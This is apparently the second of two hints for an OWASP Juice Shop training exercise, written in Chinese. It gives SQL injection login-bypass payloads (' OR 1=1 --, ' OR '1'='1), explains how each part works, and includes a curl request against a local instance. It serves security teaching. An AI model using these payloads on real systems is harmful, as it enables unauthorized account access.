### 提示 2/2

**绕过登录的经典 payload**：

在 Juice Shop 登录页面的邮箱输入框中输入：
\`\`\`
' OR 1=1 --
\`\`\`

注意：`'`（单引号）用于闭合原本的字符串，`OR 1=1` 让条件永远为真，`--` 注释掉后面的所有内容。

如果上面不行，试试：
\`\`\`
' OR '1'='1
\`\`\`

**用 curl 测试**：
\`\`\`
curl -X POST http://127.0.0.1:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"'"'"' OR 1=1 --","password":"x"}'
\`\`\`
